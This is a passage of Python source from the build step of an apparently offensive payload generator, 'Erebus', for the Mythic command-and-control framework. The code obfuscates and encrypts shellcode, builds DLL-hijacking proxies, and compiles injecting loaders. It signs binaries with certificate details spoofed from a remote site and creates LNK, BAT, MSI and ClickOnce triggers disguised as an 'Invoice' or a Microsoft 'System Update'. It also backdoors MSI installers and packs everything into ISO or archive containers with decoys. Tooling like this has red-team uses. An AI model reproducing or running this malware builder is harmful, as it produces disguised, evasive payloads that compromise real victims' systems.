                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encryption_shellcode_path))
                elif self.get_parameter("2.4 Shellcode Format") == "CSharp":
                    # For CSharp format, copy to encryption_shellcode_path which will be read later
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encryption_shellcode_path))
                    output += f"[DEBUG] Copied CSharp shellcode to {encryption_shellcode_path}\n"

                if self.get_parameter("2.4 Shellcode Format") == "Raw":
                    # Get the encryption key in C format to be used within the loader and other functions
                    cmd = [
                        "python",
                        shellcrypt_path,
                        "-i", mythic_shellcode_path,
                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        "-f",
                        "c",
                        "-a",
                        "shellcode"
                    ]

                    if self.get_parameter("2.2 Encryption Key") != "NONE":
                        cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                    shellcode_src = subprocess.check_output(cmd, text=True)
                    output += shellcode_src

                    # Write key to file
                    start = shellcode_src.find("unsigned char key")
                    end   = shellcode_src.find("};", start) + 2
                    key_array = shellcode_src[start:end]
                    output += key_array
                    with open(encryption_shellcode_path, "w") as file:
                        file.write(key_array)

                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    response.build_stdout = output + "\n" + obfuscated_shellcode_path
                    response.updated_filename = "erebus_wrapper.bin"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscating Shellcode - Continuing to Shellcode Loader",
                        StepSuccess=True,
                    ))
                    # Remove this line to continue to the next exec cycle (Triggers, Containers, etc.)
                    # return response
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Shellcode Obfuscation",
                        StepStdout="Obfuscating Shellcode - Continuing to DLL Loader",
                        StepSuccess=True,
                    ))
            elif proc.returncode != 0:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            else:
                response.payload = b""
                response.status = BuildStatus.Error
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            output = ""
            ######################### End of Shellcode Obfuscation Section #########################

            ######################### DLL Hijacking Section #########################
            if self.get_parameter("0.0 Main Payload Type") == "Hijack":
                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')

                file_content = await getFileFromMythic(
                    agentFileId=self.get_parameter("1.0 DLL Hijacking")
                )

                file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    AgentFileID=self.get_parameter("1.0 DLL Hijacking")
                ))

                dll_file_name = ""
                if file_name_resp.Success:
                    if len(file_name_resp.Files) > 0:
                        dll_file_name = file_name_resp.Files[0].Filename

                payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
                payload_path = str(payload_path)

                with open(dll_target_path, "wb") as file:
                    file.write(file_content)

                exports = await generate_proxies(dll_file=dll_target_path,dll_file_name=dll_file_name)

                with open(obfuscated_shellcode_path, "r") as file:
                    shellcode_content = file.read()

                shellcode = {
                    "SHELLCODE": shellcode_content
                }

                exports_list = {
                    "EXPORTS": exports
                }

                dll_template = environment.get_template("dll_template.cpp")
                proxy_template = environment.get_template("proxy.def")
                dll_output = dll_template.render(**shellcode)
                proxy_output = proxy_template.render(**exports_list)

                with open(dll_hijack_template_path, "w") as file:
                    file.write(dll_output)

                with open(dll_exports_path, "w") as file:
                    file.write(proxy_output)

                # Check if the file size stayed the same as the template
                if os.stat(dll_hijack_template_path).st_size == 1598 or os.stat(dll_exports_path).st_size == 13:
                    response.status = BuildStatus.Error
                    response.build_message = "Failed to proxy the given file."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering DLL Exports for Hijacking",
                        StepStdout="Failed to proxy the given file.",
                        StepSuccess=False,
                    ))
                    return response
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Proxied! Compiling Payload..."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Gathering DLL Exports for Hijacking",
                        StepStdout="DLL Proxied! Compiling Payload...",
                        StepSuccess=True,
                    ))

                cmd = [
                    "x86_64-w64-mingw32-gcc",
                    "-shared",
                    "-o",
                    payload_path,
                    dll_hijack_template_path,
                    dll_exports_path,
                    "-I/usr/x86_64-w64-mingw32/include",
                    "-L/usr/x86_64-w64-mingw32/lib"
                    "-e DllMain",
                    "-DDLL",
                ]

                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                stdout, stderr = await process.communicate()

                if stdout:
                    output += f"[stdout]\n{stdout.decode()}"
                if stderr:
                    output += f"[stderr]\n{stderr.decode()}"

                if os.path.exists(payload_path):
                    # response.payload = open(payload_path, "rb").read()
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    # response.updated_filename = dll_file_name
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling DLL Payload",
                        StepStdout="DLL Loader Compiled!",
                        StepSuccess=True,
                    ))
                    # Debug
                    # return response
                else:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling DLL Payload",
                        StepStdout="Failed to Compile DLL Payload",
                        StepSuccess=False,
                    ))
                    return response
                output = ""
            ######################### End Of DLL Hijacking Section #########################

            ######################### Shellcode Loader Section #########################
            if self.get_parameter("0.0 Main Payload Type") == "Loader":
                print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
                # Logic : Select between shellcode loader and clickonce loader
                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                src=obfuscated_shellcode_path)

                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                    payload_path = str(payload_path)

                    # ===== Configure Shellcode Loader config.hpp =====
                    config_hpp_template_path = PurePath(agent_build_path) / "templates" / "config.hpp"
                    config_hpp_template_path = str(config_hpp_template_path)
                    config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
                    config_hpp_destination = str(config_hpp_destination)

                    try:
                        # Load and render the config.hpp template
                        config_template = environment.get_template("config.hpp")
                        config_data = {
                            "TARGET_PROCESS": self.get_parameter("0.5 Shellcode Loader - Target Process"),
                            "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                        }
                        rendered_config = config_template.render(**config_data)

                        # Write the rendered config to the destination
                        with open(config_hpp_destination, "w") as config_file:
                            config_file.write(rendered_config)

                        response.status = BuildStatus.Success
                        response.build_message = "Shellcode Loader config generated!"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring Shellcode Loader",
                            StepStdout="Generated config.hpp with user-defined injection parameters",
                            StepSuccess=True,
                        ))
                    except Exception as e:
                        response.status = BuildStatus.Error
                        response.build_stderr = f"Failed to render Shellcode Loader config: {str(e)}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring Shellcode Loader",
                            StepStdout=f"Failed to render config.hpp: {str(e)}",
                            StepSuccess=False,
                        ))
                        return response

                    # Convert resource file to UTF16
                    cmd = [
                        "iconv",
                        "-f",
                        "UTF-16LE",
                        "-t",
                        "UTF-8",
                        f"{shellcode_loader_path}/Erebus.Loader.rc",
                    ]

                    resource_file = subprocess.check_output(cmd, text=True)
                    with open(f"{shellcode_loader_path}/Erebus.Loader.utf8.rc", "w") as file:
                        file.write(resource_file)

                    cmd = [
                        "mv",
                        f"{shellcode_loader_path}/Erebus.Loader.utf8.rc",
                        f"{shellcode_loader_path}/Erebus.Loader.rc",
                    ]
                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()

                    if stdout:
                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
                    if stderr:
                        output += f"[stderr]\n{stderr.decode(errors='replace')}"

                    # Compile Loader
                    cmd = [
                        "make",
                        "-C",
                        shellcode_loader_path,
                        f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
                        "all"
                    ]
                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()

                    if stdout:
                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
                    if stderr:
                        output += f"[stderr]\n{stderr.decode(errors='replace')}"

                    shutil.copy(dst=payload_path, src=f"{shellcode_loader_path}/erebus.exe")

                    if os.path.exists(payload_path):
                        # Debug
                        # response.payload = open(payload_path, "rb").read()
                        # response.updated_filename = "erebus_loader.exe"
                        response.status = BuildStatus.Success
                        response.build_message = "Loader Compiled!"
                        response.build_stdout = output + "\n" + payload_path
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling Shellcode Loader",
                            StepStdout="Shellcode Loader Compiled!",
                            StepSuccess=True,
                        ))

                        # return response
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to compile loader"
                        response.build_stderr = output + "\n" + payload_path
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling Shellcode Loader",
                            StepStdout="Failed to Compile Shellcode Loader",
                            StepSuccess=False,
                        ))
                        return response
                    output = ""
                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                    payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                    payload_path = str(payload_path)

                    # ===== Configure ClickOnce InjectionConfig.cs =====
                    injection_config_template_path = PurePath(agent_build_path) / "templates" / "InjectionConfig.cs"
                    injection_config_template_path = str(injection_config_template_path)
                    injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
                    injection_config_destination = str(injection_config_destination)

                    try:
                        encryption_key_bytes = ""
                        encrypted_shellcode_bytes = ""
                        if os.path.exists(encryption_shellcode_path):
                            try:
                                with open(encryption_shellcode_path, "r") as combined_file:
                                    combined_content = combined_file.read()
                                    output += f"[DEBUG] File read from: {encryption_shellcode_path}\n"
                                    output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                    output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                    import re
                                    
                                    # Extract key array bytes - handles both C++ and C# formats
                                    # Matches: key[2] = { ... } or byte[] key[2] = { ... }
                                    key_match = re.search(r'(?:byte\[\]\s+)?key\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if key_match:
                                        key_section = key_match.group(1)
                                        hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                        if hex_key:
                                            encryption_key_bytes = ", ".join(hex_key)
                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes}\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Key array not found in file\n"
                                    
                                    # Extract shellcode array bytes - handles both C++ and C# formats
                                    # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
                                    shellcode_match = re.search(r'(?:byte\[\]\s+)?(?:sh3llc0d3|shellcode)\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if shellcode_match:
                                        shellcode_section = shellcode_match.group(1)
                                        hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                        if hex_shellcode:
                                            encrypted_shellcode_bytes = ", ".join(hex_shellcode)
                                            output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Shellcode array not found in file\n"
                                    
                            except Exception as extract_error:
                                output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                        else:
                            output += f"[DEBUG] File does not exist: {encryption_shellcode_path}\n"

                        injection_config_template = environment.get_template("InjectionConfig.cs")
                        injection_config_data = {
                            "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                            "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                            "ENCRYPTION_KEY": encryption_key_bytes,
                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes
                        }
                        rendered_injection_config = injection_config_template.render(**injection_config_data)

                        with open(injection_config_destination, "w") as config_file:
                            config_file.write(rendered_injection_config)

                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce config generated!"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring ClickOnce Loader",
                            StepStdout="Generated InjectionConfig.cs with user-defined injection parameters",
                            StepSuccess=True,
                        ))
                    except Exception as e:
                        response.status = BuildStatus.Error
                        response.build_stderr = f"Failed to render ClickOnce config: {str(e)}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Configuring ClickOnce Loader",
                            StepStdout=f"Failed to render InjectionConfig.cs: {str(e)}",
                            StepSuccess=False,
                        ))
                        return response

                    # Compile ClickOnce Loader using Makefile
                    # Makefile target "publish" automatically handles build, cleanup, and verification
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    rid = self.get_parameter('0.4 ClickOnce RID') or "win-x64"
                    
                    cmd = [
                        "make",
                        "-C",
                        clickonce_loader_path,
                        f"CONFIG={build_config}",
                        f"RID={rid}",
                        "publish"
                    ]

                    process = await asyncio.create_subprocess_exec(
                        *cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()

                    if stdout:
                        output += f"[stdout]\n{stdout.decode(errors='replace')}"
                    if stderr:
                        output += f"[stderr]\n{stderr.decode(errors='replace')}"
                    
                    if process.returncode != 0:
                        response.status = BuildStatus.Error
                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
                        response.build_stderr = output
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling ClickOnce Loader",
                            StepStdout=f"Makefile publish failed",
                            StepSuccess=False,
                        ))
                        return response

                    # Locate publish output: bin/{config}/{tfm}/{rid}/publish
                    # Makefile ensures cleanup happens, so all remaining files are needed
                    publish_root = Path(clickonce_loader_path) / "bin" / build_config

                    publish_dir = None
                    if publish_root.exists():
                        # Traverse: CONFIG/TFM/RID/publish
                        for tfm_dir in publish_root.iterdir():
                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
                                # Found TFM directory (e.g., net7.0-windows)
                                for rid_dir in tfm_dir.iterdir():
                                    if rid_dir.is_dir():
                                        candidate = rid_dir / "publish"
                                        if candidate.exists():
                                            publish_dir = candidate
                                            break
                                if publish_dir:
                                    break

                    if not publish_dir or not publish_dir.exists():
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate ClickOnce publish output directory"
                        response.build_stderr = output + f"\nSearched in: {publish_root}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling ClickOnce Loader",
                            StepStdout="Failed to locate ClickOnce publish output",
                            StepSuccess=False,
                        ))
                        return response

                    # Copy cleaned artifacts from publish directory to payload directory
                    # Makefile cleanup removes debug symbols and unnecessary runtime files
                    payload_dir = Path(agent_build_path) / "payload"
                    payload_dir.mkdir(parents=True, exist_ok=True)

                    # Copy all files from publish directory (already cleaned by Makefile)
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            dest_path = payload_dir / item.name
                            shutil.copy2(str(item), str(dest_path))
                            # Try to hide files on Windows
                            try:
                                import ctypes
                                FILE_ATTRIBUTE_HIDDEN = 0x02
                                ctypes.windll.kernel32.SetFileAttributesW(str(dest_path), FILE_ATTRIBUTE_HIDDEN)
                            except:
                                pass

                    # Log available files after cleanup
                    output += f"[DEBUG] Cleaned publish artifacts:\n"
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"

                    # Locate main executable (Makefile ensures it exists)
                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"

                    if clickonce_exe.exists():
                        # Copy exe as primary payload
                        shutil.copy2(str(clickonce_exe), str(payload_path))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    elif clickonce_dll.exists():
                        # Fallback to DLL if exe not present
                        payload_path_dll = Path(payload_path).with_suffix(".dll")
                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate compiled ClickOnce executable"
                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Compiling ClickOnce Loader",
                            StepStdout="Failed to locate executable",
                            StepSuccess=False,
                        ))
                        return response
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling ClickOnce Loader",
                        StepStdout="ClickOnce Loader Compiled!",
                        StepSuccess=True,
                    ))
                    output = ""

            ######################### End Of Shellcode Loader Section #########################
            ######################### Code Signing Section #########################
            if self.get_parameter("6.0 Codesign Loader"):
                try:
                    payload_path = Path(agent_build_path) / "payload" / "erebus.exe"

                    if not payload_path.exists():
                        raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")

                    signing_type = self.get_parameter("6.1 Codesign Type")
                    success_msg = ""

                    if signing_type == "SelfSign":
                        cn = self.get_parameter("6.2 Codesign CN")
                        org = self.get_parameter("6.3 Codesign Orgname") or cn

                        self_sign_payload(
                            payload_path=payload_path,
                            subject_cn=cn,
                            org_name=org
                        )
                        success_msg = f"Self-signed with CN: {cn}"

                    elif signing_type == "Spoof URL":
                        target_url = self.get_parameter("6.4 Codesign Spoof URL")
                        if not target_url:
                            raise ValueError("No URL provided for spoofing")

                        cert_details = get_remote_cert_details(target_url)
                        self_sign_payload(
                            payload_path=payload_path,
                            subject_cn=cert_details["CN"],
                            org_name=cert_details["O"],
                            full_details=cert_details
                        )
                        success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"

                    elif signing_type == "Provide Certificate":
                        cert_uuid = self.get_parameter("6.5 Codesign Cert")
                        cert_pass = self.get_parameter("6.6 Codesign Cert Password")

                        if not cert_uuid:
                            raise ValueError("No certificate file uploaded")

                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
                        )

                        if not file_resp.Success:
                            raise ValueError("Failed to retrieve certificate file")

                        cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
                        cert_path.write_bytes(file_resp.Content)

                        sign_with_provided_cert(
                            payload_path=payload_path,
                            cert_path=cert_path,
                            cert_password=cert_pass
                        )
                        success_msg = "Signed with provided certificate"

                    elif signing_type == "Provide Certificate":
                        raise NotImplementedError("Provide Certificate mode not yet implemented in backend")

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Sign Shellcode Loader",
                        StepStdout=f"Success: {success_msg}",
                        StepSuccess=True
                    ))

                except Exception as e:
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Sign Shellcode Loader",
                        StepStdout=f"Signing Failed: {str(e)}",
                        StepSuccess=False
                    ))
                    response.status = BuildStatus.Error
                    response.build_stderr = f"Code signing failed: {str(e)}"
                    return response


            ######################### Creating Decoy Section #########################
            decoy_dir = Path(agent_build_path) / "decoys"
            decoy_file_uuid = self.get_parameter("0.10 Decoy File")

            if decoy_file_uuid:
                try:
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=decoy_file_uuid)
                    )

                    file_name_resp = await SendMythicRPCFileSearch(
                        MythicRPCFileSearchMessage(AgentFileID=decoy_file_uuid)
                    )
                    custom_filename = "decoy.pdf"
                    if file_name_resp.Success and len(file_name_resp.Files) > 0:
                        custom_filename = file_name_resp.Files[0].Filename

                    if decoy_dir.exists():
                        shutil.rmtree(decoy_dir)
                    decoy_dir.mkdir(parents=True, exist_ok=True)
                    custom_decoy_path = decoy_dir / custom_filename
                    custom_decoy_path.write_bytes(file_resp.Content)

                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Creating Decoy",
                            StepStdout=f"Replaced default decoys with custom file: {custom_filename}",
                            StepSuccess=True
                        ))

                except Exception as e:
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Creating Decoy",
                            StepStdout=f"Failed to process custom decoy: {str(e)}",
                            StepSuccess=False
                        ))
            else:
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Creating Decoy",
                        StepStdout="Using default decoy files.",
                        StepSuccess=True
                    ))
            ######################### End of Decoy Section #########################
            ######################### Trigger Generation Section #########################
            if self.get_parameter("0.0 Main Payload Type") == "Loader":

                payload_dir = Path(agent_build_path) / "payload"
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file = decoy_dir / "decoy.pdf"

                trigger_type = self.get_parameter("0.11 Trigger Type")

                try:
                    trigger_path = ""

                    match trigger_type:
                        case "LNK":
                            trigger_path = create_payload_trigger(
                                target_bin=str(self.get_parameter("0.8 Trigger Binary")),
                                args=str(self.get_parameter("0.9 Trigger Command")),
                                icon_src=r"C:\\Windows\\System32\\imageres.dll",
                                icon_index=0,
                                description="Invoice",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "BAT":
                            trigger_path = create_bat_payload_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "MSI":
                            trigger_path= create_msi_payload_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )
                        case "ClickOnce":
                            trigger_path = await create_clickonce_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                                app_name="System Update",
                                app_publisher="Microsoft Corporation"
                            )

                    if trigger_path:
                        response.status = BuildStatus.Success
                        response.build_message = f"{trigger_type} Trigger created!"

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Adding Trigger",
                            StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
                            StepSuccess=True,
                        ))
                except Exception as e:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Adding Trigger",
                        StepStdout=f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}",
                        StepSuccess=False,
                    ))
                    return response
            ######################### End Of Trigger Generation Section #########################
            ######################### MSI Backdooring Section #########################

            # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
            await self.backdoor_msi_payload(agent_build_path)

            ######################### End Of MSI Backdooring Section #########################
            ######################### Final Payload / Container #########################

            # 1. Capture context for container function
            if 'payload_path' in locals():
                final_path = payload_path
            else:
                final_path = obfuscated_shellcode_path

            self.generated_payload_path = final_path
            self.agent_build_path = agent_build_path

            # 2. Attempt Containerization
            container_path = await self.containerise_payload(agent_build_path)

            if container_path:
                # Case A: Container created (7z/MSI)
                with open(container_path, "rb") as f:
                    response.payload = f.read()

                container = self.get_parameter("3.0 Container Type")
                match container:
                    case "7z":
                        ext = "7z"
                    case "Zip":
                        ext = "zip"
                    case "MSI":
                        ext = "msi"
                    case "ISO":
                        ext = "iso"
                    case _:
                        ext = "bin"

                response.updated_filename = f"payload.{ext}"
                response.status = BuildStatus.Success
                response.build_message = f"Success! Containerized ({container})"

                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Containerising",
                    StepStdout=f"Payload packaged into {container} container",
                    StepSuccess=True,
                ))

            return response

        except Exception as e:
            response.status = BuildStatus.Error
            response.build_message = f"Error building wrapper: {str(e)}\n{output}"
            return response
